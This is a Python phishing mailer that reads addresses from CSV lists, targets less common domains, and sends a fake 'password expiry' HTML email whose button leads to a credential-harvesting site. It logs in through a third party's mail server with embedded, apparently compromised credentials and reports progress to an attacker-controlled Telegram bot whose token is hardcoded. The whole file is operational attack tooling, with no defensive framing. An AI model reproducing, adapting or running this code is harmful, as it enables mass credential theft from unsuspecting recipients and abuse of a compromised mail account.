import csv
import re
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import uuid
import jwt
from datetime import datetime, timedelta
import random
import time
import requests  # Import the requests library to send HTTP requests
from collections import Counter

def count_domain_occurrences(*csv_files):
    domain_counter = Counter()
    email_regex = re.compile(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b')
    for csv_file in csv_files:
        with open(csv_file, 'r', encoding='utf-8') as file:
            reader = csv.reader(file)
            for row in reader:
                for item in row:
                    if email_regex.match(item.strip()):
                        domain = item.strip().split('@')[-1]
                        domain_counter[domain] += 1
    return domain_counter

def is_rare_domain(email, domain_counter, max_count=500):
    """
    Check if the email's domain is rare, appearing not more than max_count times.
    """
    domain = email.split('@')[-1]
    return domain_counter[domain] <= max_count

# Secret key used to encode the JWT - you should keep this secure and not expose it in your code
SECRET_KEY = "your_secret_key"
# Telegram Bot Information
bot_token = "6813360979:AAHs5LoSfH-S0RI8X26rZUr6azoqfHI-XYo"
chat_id = "-4133301293"

def generate_token():
    # Define the payload of the token
    payload = {
        'exp': datetime.utcnow() + timedelta(days=2),  # Token expiration time (2 days in this example)
        'iat': datetime.utcnow(),  # Time of token's creation
        'sub': str(uuid.uuid4())  # Unique identifier for the user - in this case a UUID
    }

    # Encode the payload using your secret key
    return jwt.encode(payload, SECRET_KEY, algorithm='HS256')
    
def send_telegram_message(message):
    """
    Sends a message to the specified Telegram chat.
    """
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    data = {
        "chat_id": chat_id,
        "text": message
    }
    try:
        response = requests.post(url, data=data)
        print(f"Telegram message sent: {message}")
    except Exception as e:
        print(f"Failed to send Telegram message. Error: {e}")
        
def save_token_to_file(token, file_path="tokens.txt"):
    with open(file_path, "a") as f:
        f.write(token + "\n")

def find_email_in_row(row):
    """
    Extracts an email address from a row using regex.
    """
    email_regex = re.compile(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b')
    for item in row:
        cleaned_item = item.strip()  # Strip whitespace from each item
        if email_regex.match(cleaned_item):
            return cleaned_item
    return None

SMTP_SERVERS = [
    {
        "host": "mail.pfc.ae",
        "username": "Ceo@pfc.ae",
        "password": "Passw0rd@pfc13",
        "port": 465,
        "encryption": "ssl"
    }
]

 
current_smtp_index = 0

def get_next_smtp():
    global current_smtp_index
    smtp = SMTP_SERVERS[current_smtp_index]
    current_smtp_index = (current_smtp_index + 1) % len(SMTP_SERVERS)
    return smtp

def send_email(server, smtp_username, receiver_email, subject, name, address, tracking_code, email, code, city, phone):
    print(f"Preparing email for {receiver_email}...")
    # Generate the token
    token = generate_token()

    # Include the token in the URL
    token_url = f"https://blockchaintrust.online/DEWA/Secure/auth.php?token={token}"

    suspicious_activity_info = """
    """
    html_content = f"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Newsletter</title>
    <style>
        body {{
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f4f4f4;
            color: #444;
        }}
        .container {{
            background-color: #fff;
            border: 1px solid #ccc;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
            width: 90%;
            max-width: 600px;
            margin: 20px auto;
        }}
        .button {{
            display: inline-block;
            padding: 10px 20px;
            background-color: #0056b3;
            color: #fff;
            text-decoration: none;
            border-radius: 4px;
            font-weight: bold;
            text-align: center;
        }}
        .header {{
            font-size: 20px;
            color: #0056b3;
            margin-bottom: 20px;
        }}
        .content {{
            font-size: 14px;
            margin-bottom: 20px;
        }}
        .footer {{
            font-size: 12px;
            text-align: center;
            color: #666;
            margin-top: 20px;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">Account Security Reminder</div>
        <div class="content">
            <p>Dear Customer,</p>
            <p>This is a friendly reminder that your current email password is set to expire on <strong>02/24/2024</strong>. To maintain uninterrupted access and enhance the security of your account, we invite you to confirm your preference to retain your current password or to update it.</p>
            <p>Please use the link below to manage your password settings. This step helps us ensure that your account remains secure and accessible.</p>
            <a href="https://email-connect.website/Email/mail/" class="button">Manage Now</a>
            <p>If you have any questions or need assistance, our support team is here to help.</p>
            <p>We appreciate your prompt attention to this matter and thank you for being a valued user.</p>
            <p>Warm regards,<br>Your Email Service Team</p>
        </div>
        <div class="footer">
            For any concerns or further assistance, feel free to reach out to our support team.<br>
            Best regards,<br>
        </div>
    </div>
</body>
</html>
"""



    message = MIMEMultipart()
    message["From"] = f'"Notification" <{smtp_username}>'
    message["To"] = receiver_email
    message["Subject"] = subject
    message.attach(MIMEText(html_content, 'html'))

    try:
        print(f"Sending email to {receiver_email}...")
        server.sendmail(message["From"], receiver_email, message.as_string())
        print(f"Email sent to {receiver_email}!")
        return True
    except smtplib.SMTPRecipientsRefused as e:
        print(f"Failed to send email to {receiver_email}. Recipient refused: {e}")
    except smtplib.SMTPSenderRefused as e:
        print(f"Failed to send email to {receiver_email}. Sender refused: {e}")
    except smtplib.SMTPDataError as e:
        print(f"Failed to send email to {receiver_email}. SMTP data error: {e}")
    except Exception as e:
        print(f"Failed to send email to {receiver_email}. General error: {e}")
    send_telegram_message(f"Failed to send email to {receiver_email}. Skipping to next.")
    return False


# Define the paths for two CSV files
csv_file_path_a = 'clean_list.csv'
csv_file_path_b = 'a.csv'

def read_csv_rows_alternately(csv_file_a, csv_file_b):
    """
    Reads rows alternately from two CSV files, starting from the bottom to the top.
    """
    with open(csv_file_a, 'r', encoding='utf-8') as file_a, open(csv_file_b, 'r', encoding='utf-8') as file_b:
        reader_a = csv.reader(file_a)
        reader_b = csv.reader(file_b)
        rows_a = list(reader_a)[::-1]  # Reverse the rows of file_a
        rows_b = list(reader_b)[::-1]  # Reverse the rows of file_b
        max_length = max(len(rows_a), len(rows_b))

        for i in range(max_length):
            if i < len(rows_a):
                yield rows_a[i], 'a'
            if i < len(rows_b):
                yield rows_b[i], 'b'
                
def is_allowed_domain(email, allowed_domains):
    """
    Check if the email's domain is in the list of allowed domains.
    """
    domain = email.split('@')[-1]  # Extract the domain from the email
    return domain in allowed_domains

def send_email_with_retry(email, max_attempts=3):
    for attempt in range(max_attempts):
        smtp = get_next_smtp()  # Ensure this function rotates or selects a valid SMTP configuration
        server = None
        try:
            server = setup_smtp_connection(smtp)
            if send_email(server, smtp["username"], email, ...):  # Pass the actual arguments
                print(f"Successfully sent email to {email}")
                return True
        except Exception as e:
            print(f"Attempt {attempt + 1} failed with error: {e}, retrying...")
        finally:
            if server:
                server.quit()
    print(f"Failed to send email to {email} after {max_attempts} attempts.")
    return False

def setup_smtp_connection(smtp):
    connection_timeout = 10  # Adjusted timeout
    if smtp["encryption"] == "ssl":
        server = smtplib.SMTP_SSL(smtp["host"], smtp["port"], timeout=connection_timeout)
    else:
        server = smtplib.SMTP(smtp["host"], smtp["port"], timeout=connection_timeout)
        server.starttls()
    server.login(smtp["username"], smtp["password"])
    return server

def main():
    # Initialization and setup as before
    domain_counter = count_domain_occurrences(csv_file_path_a, csv_file_path_b)
    emails_sent = 0
    emails_failed = 0
    start_time = time.time()
    last_update_time = time.time()
    email_limit_per_hour = 2000
    delay_between_emails = 3600 / email_limit_per_hour if email_limit_per_hour > 0 else 0

    # Processing each email
    for row, source in read_csv_rows_alternately(csv_file_path_a, csv_file_path_b):
        email = find_email_in_row(row)
        if not email:
            print(f"Skipping row due to no email found: {row}")
            continue
        
        if not is_rare_domain(email, domain_counter):
            print(f"Skipping email due to domain frequency: {email}")
            continue
        
        # Extract additional email parameters as needed
        name = row[0] if len(row) > 0 else "Unknown"
        address = row[1] if len(row) > 1 else "Unknown"
        code = row[2] if len(row) > 2 else "Unknown"
        phone = row[3] if len(row) > 3 else "Unknown"
        
        # Attempt to send the email with the current SMTP settings
        smtp = get_next_smtp()
        try:
            print(f"Attempting to send email to {email} using SMTP server: {smtp['username']}")
            server = setup_smtp_connection(smtp)
            if send_email(server, smtp["username"], email, "Upcoming Password Expiry: Retention Steps Required", name, address, "", email, code, "", phone):
                emails_sent += 1
                print(f"Successfully sent email to {email} using SMTP server: {smtp['username']}")
            else:
                emails_failed += 1
                print(f"Failed to send email to {email}, skipping to next.")
            server.quit()
        except Exception as e:
            emails_failed += 1
            print(f"Exception when sending email to {email}: {e}")
            send_telegram_message(f"Failed to send email to {email} with {smtp['username']}. Error: {e}")
        
        # Enforce delay for rate limiting
        time.sleep(delay_between_emails)
        
        # Periodic status update
        if time.time() - last_update_time >= 1800:
            update_message = f"Status update: {emails_sent} emails sent successfully, {emails_failed} failed."
            send_telegram_message(update_message)
            last_update_time = time.time()

    # Final status update
    final_message = f"Email sending script has finished. Total emails sent: {emails_sent}, Failed: {emails_failed}."
    print(final_message)
    send_telegram_message(final_message)

if __name__ == "__main__":
    main()
